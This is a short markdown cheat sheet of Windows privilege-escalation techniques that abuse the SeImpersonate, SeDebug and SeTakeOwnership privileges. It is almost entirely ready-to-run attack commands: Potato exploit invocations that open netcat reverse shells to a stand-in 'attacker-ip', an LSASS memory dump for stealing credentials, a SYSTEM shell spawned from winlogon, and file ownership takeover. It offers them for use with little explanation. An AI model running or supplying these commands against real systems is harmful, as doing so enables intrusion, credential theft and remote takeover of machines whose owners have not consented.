## Windows User Privileges

### SeImpersonate/SeAssignPrimaryToken
> Allows impersonation of tokens - can be exploited with Potato attacks

```powershell
# Check if you have the privilege
whoami /priv

# For Windows Server 2016 & below
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe attacker-ip 4444 -e cmd.exe" -t *

# For Windows Server 2019 & Windows 10 (1809+)
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe attacker-ip 4444 -e cmd"
c:\tools\RoguePotato.exe -r attacker-ip -e "c:\tools\nc.exe attacker-ip 4444 -e cmd.exe" -l 9999
```

### SeDebugPrivilege
> Allows attaching to and debugging processes - can dump LSASS or inject into processes

```powershell
# Enable the privilege if disabled
Import-Module .\Enable-Privilege.ps1
Enable-Privilege -Name "SeDebugPrivilege"

# Dump LSASS for credentials
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# RCE as SYSTEM
$system_pid = Get-Process winlogon | Select -ExpandProperty Id
[MyProcess]::CreateProcessFromParent($system_pid,"cmd.exe","")
```

### SeTakeOwnershipPrivilege
> Allows to take ownership of any securable object

```powershell
# Enable the privilege
Enable-Privilege -Name "SeTakeOwnershipPrivilege"

# Take ownership of a file
takeown /f "C:\path\to\file.txt"

# Modify permissions to gain full access
icacls "C:\path\to\file.txt" /grant username:F
```
